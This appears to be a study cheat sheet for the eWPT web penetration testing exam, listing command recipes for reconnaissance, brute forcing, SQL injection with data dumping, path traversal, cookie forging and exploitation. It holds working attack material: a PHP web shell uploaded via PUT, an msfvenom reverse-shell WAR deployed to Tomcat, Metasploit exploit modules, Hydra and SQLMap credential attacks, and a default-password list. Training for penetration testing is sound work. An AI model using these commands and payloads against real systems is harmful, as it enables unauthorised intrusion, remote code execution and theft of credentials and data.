# eWPT Cheat Sheet 🛠️

> All tools and commands used during eWPT preparation and exam

---

## 🔍 Reconnaissance & Fingerprinting

### Nmap
```bash
# Basic service detection
nmap -sV -p- --open <target>

# Aggressive scan
nmap -A -p 80,443,8080,8443 <target>

# Scan full subnet
nmap -sV -p 80,443,8080 --open 10.10.10.0/24

# HTTP methods check
nmap --script http-methods -p 80,443 <target>

# robots.txt check
nmap --script http-robots.txt -p 80 <target>

# HTTP enumeration
nmap --script http-enum -p 80,8080 <target>

# Check auth type
nmap --script http-auth-finder -p 80 <target>
```

### Whatweb
```bash
# Basic fingerprint
whatweb http://<target>

# Verbose output
whatweb -v http://<target>

# Scan range
whatweb http://10.10.10.0/24
```

### Curl
```bash
# Check headers
curl -I http://<target>

# Follow redirects
curl -L http://<target>

# Check HTTP methods
curl -X OPTIONS http://<target> -I

# Send custom header
curl -H "Authorization: Basic base64" http://<target>

# Save cookies
curl -c cookies.txt http://<target>

# Use cookies
curl -b cookies.txt http://<target>

# POST request
curl -X POST http://<target>/login \
-d "username=admin&password=admin"

# Basic Auth
curl -u admin:password http://<target>

# Digest Auth
curl --digest -u admin:password http://<target>
```

---

## 📂 Directory & File Discovery

### Gobuster
```bash
# Directory brute force
gobuster dir -u http://<target> \
-w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://<target> \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,bak,sql,zip

# With status codes
gobuster dir -u http://<target> \
-w /usr/share/wordlists/dirb/common.txt \
-s 200,301,302

# DNS subdomain enum
gobuster dns -d <domain> \
-w /usr/share/wordlists/subdomains.txt
```

### Dirsearch
```bash
# Basic scan
dirsearch -u http://<target>

# With extensions
dirsearch -u http://<target> -e php,html,js,txt

# Custom wordlist
dirsearch -u http://<target> \
-w /usr/share/wordlists/dirb/common.txt
```

---

## 🔑 Authentication Testing

### Hydra
```bash
# HTTP GET brute force
hydra -l admin -P rockyou.txt \
http-get://<target>

# HTTP POST form
hydra -l admin -P rockyou.txt \
<target> http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid"

# SSH brute force
hydra -l admin -P rockyou.txt \
ssh://<target>

# MySQL brute force
hydra -l root -P rockyou.txt \
mysql://<target>

# With port
hydra -l admin -P rockyou.txt \
-s 8080 <target> http-post-form \
"/login:user=^USER^&pass=^PASS^:error"
```

### WPScan (WordPress)
```bash
# Enumerate users
wpscan --url http://<target> --enumerate u

# Brute force passwords
wpscan --url http://<target> \
--usernames admin \
--passwords /usr/share/wordlists/rockyou.txt

# Full enumeration
wpscan --url http://<target> \
--enumerate u,p,t,tt
```

### JoomScan (Joomla)
```bash
# Full scan
joomscan -u http://<target>
```

---

## 💉 Injection Attacks

### SQLMap
```bash
# Basic injection test
sqlmap -u "http://<target>/?id=1" --dbs --batch

# POST parameter
sqlmap -u "http://<target>/login" \
--data="user=admin&pass=test" \
--dbs --batch

# Get tables
sqlmap -u "http://<target>/?id=1" \
-D database_name --tables --batch

# Get data
sqlmap -u "http://<target>/?id=1" \
-D database_name -T users --dump --batch

# Get passwords
sqlmap -u "http://<target>/?id=1" \
--passwords --batch

# Higher level
sqlmap -u "http://<target>/?id=1" \
--level=5 --risk=3 --batch
```

---

## 📁 File Upload & Traversal

### Directory Traversal
```bash
# Basic traversal
curl "http://<target>/?file=../../../etc/passwd"

# URL encoded
curl "http://<target>/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoded
curl "http://<target>/?file=..%252f..%252fetc%252fpasswd"

# Null byte (older PHP)
curl "http://<target>/?file=../../../etc/passwd%00"

# Mixed traversal
curl "http://<target>/?file=....//....//etc/passwd"

# Windows path
curl "http://<target>/?file=..\..\..\..\windows\win.ini"
```

### File Upload Testing
```bash
# Test PUT method
curl -X PUT http://<target>/shell.txt -d "test"

# Upload via PUT
curl -X PUT http://<target>/shell.php \
-d "<?php system($_GET['cmd']); ?>"

# Test WebDAV
curl -X OPTIONS http://<target> -I | grep Allow
```

### WAR File (Tomcat RCE)
```bash
# Generate WAR shell
msfvenom -p java/jsp_shell_reverse_tcp \
LHOST=<your-ip> LPORT=4444 \
-f war -o shell.war

# Upload to Tomcat Manager
curl -u admin:admin \
-T shell.war \
"http://<target>:8080/manager/deploy?path=/shell"

# Trigger shell
curl http://<target>:8080/shell/
```

---

## 🔐 Password Cracking

### John the Ripper
```bash
# Basic crack
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specific format
john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=Raw-MD5

john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=Raw-SHA256

john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=Raw-SHA1

# Apache MD5
john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=md5crypt

# Show cracked
john --show hash.txt
```

### Hashcat
```bash
# MD5
hashcat -m 0 hash.txt rockyou.txt

# SHA256
hashcat -m 1400 hash.txt rockyou.txt

# Apache MD5
hashcat -m 1600 hash.txt rockyou.txt

# With rules
hashcat -m 0 hash.txt rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule
```

---

## 🌐 Web Application Tools

### Nikto
```bash
# Basic scan
nikto -h http://<target>

# HTTPS scan
nikto -h https://<target>

# Multiple ports
nikto -h <target> -p 80,8080,8443

# With output
nikto -h http://<target> -o report.txt
```

---

## 📍 Common CMS Locations

### WordPress
```
/wp-admin/
/wp-login.php
/xmlrpc.php
/wp-content/
/wp-config.php
/wp-content/uploads/
/wp-content/plugins/
/wp-content/themes/
/wp-includes/
```

### Joomla
```
/administrator/
/configuration.php
/components/
/modules/
/templates/
/cache/
/libraries/
/plugins/
```

### Metasploit
```bash
# Tomcat WAR upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target>
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set LHOST <your-ip>
run

# Apache path traversal
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS <target>
set RPORT 8082
run

# HTTP login scanner
use auxiliary/scanner/http/http_login
set RHOSTS <target>
set RPORT 80
set AUTH_URI /login
set USER_FILE /tmp/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# MySQL login
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target>
set USERNAME root
set PASS_FILE rockyou.txt
run
```

### Burp Suite
```
- Intercept & modify requests
- Intruder for brute forcing
- Repeater for manual testing
- Scanner for automated checks
- Decoder for encoding/decoding
- Sequencer for session analysis
```

---

## 🍪 Session & Cookie Testing

### Flask Cookie Manipulation
```bash
# Install flask-unsign
pip3 install flask-unsign

# Decode cookie
flask-unsign --decode --cookie 'COOKIE_VALUE'

# Brute force secret key
flask-unsign --unsign --cookie 'COOKIE_VALUE' \
--wordlist rockyou.txt

# Forge cookie
flask-unsign --sign \
--cookie "{'permission': 1, 'username': 'admin'}" \
--secret 'SECRET_KEY'
```

### Cookie Testing with Curl
```bash
# Set custom cookie
curl -b "permission=1; session=VALUE" \
http://<target>/admin

# Save and reuse cookies
curl -c cookies.txt http://<target>/login
curl -b cookies.txt http://<target>/dashboard
```

---

## 🔌 API Testing

### FastAPI/REST API
```bash
# Get API docs
curl -s http://<target>/docs
curl -s http://<target>/openapi.json | python3 -m json.tool

# Get auth token
curl -X POST http://<target>/token/ \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=admin&password=admin"

# Use token
curl -H "Authorization: Bearer TOKEN" \
http://<target>/api/endpoint

# Test HTTP methods on endpoint
curl -X OPTIONS http://<target>/api -I

# Test TRACE method (may expose sensitive data)
curl -X TRACE http://<target>/api
```

---

## 🖥️ Remote Access

### Netcat
```bash
# Listen for reverse shell
nc -lvnp 4444

# Connect to target port
nc <target> 80

# Banner grabbing
nc <target> 80
GET / HTTP/1.0

# Simple port check
nc -zv <target> 80
```

### Searchsploit
```bash
# Search for WordPress exploits
searchsploit wordpress

# Search for Joomla exploits
searchsploit joomla

# Search Apache version
searchsploit apache 2.4

# Search specific CVE
searchsploit CVE-2021-41773

# Copy exploit to current dir
searchsploit -m <exploit_path>

# Update database
searchsploit -u
```

### SSH
```bash
# Basic connection
ssh user@<target>

# With password (sshpass)
sshpass -p 'password' ssh user@<target>

# Run command
ssh user@<target> "uname -r"
```

### RDP
```bash
# Connect via xfreerdp
xfreerdp /u:admin /p:password /v:<target>

# With domain
xfreerdp /u:admin /p:password /d:domain /v:<target>
```

---

## 🗄️ Database

### MySQL/MariaDB
```bash
# Connect (password inline - no space after -p)
mysql -h <target> -u root -ppassword

# Connect (interactive password prompt - safer)
mysql -h <target> -u root -p
# then enter password when prompted

# With custom port
mysql -h <target> -u root -p -P 3307

# Run query inline
mysql -h <target> -u root -ppassword \
-e "SHOW DATABASES;"

# Useful queries once connected
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
SELECT user, password FROM mysql.user;

# Dump database
mysqldump -h <target> -u root -ppassword \
database_name > dump.sql
```

---

## 🔎 OSINT & Passive Recon

```bash
# WHOIS
whois <domain>

# DNS enumeration
dig any <domain>
nslookup -type=any <domain>

# Certificate transparency
# Check: https://crt.sh/?q=<domain>

# theHarvester
theHarvester -d <domain> -b all

# Subdomain enumeration
gobuster dns -d <domain> \
-w /usr/share/wordlists/subdomains.txt
```

---

## 📝 Quick Reference

### Common Default Credentials
```
admin:admin
admin:password
admin:123456
root:root
root:toor
admin:nexustech
tomcat:tomcat
manager:manager
```

### Common File Extensions to Test
```
.php .asp .aspx .jsp .py .rb
.bak .old .txt .sql .zip .tar.gz
.conf .config .env .log
```

### HTTP Response Codes
```
200 → OK
301 → Redirect
401 → Unauthorized (auth required)
403 → Forbidden
404 → Not Found
405 → Method Not Allowed
500 → Internal Server Error
```

### Hash Identification
```
32 chars  → MD5
40 chars  → SHA1
64 chars  → SHA256
$apr1$    → Apache MD5
$2b$      → bcrypt
```
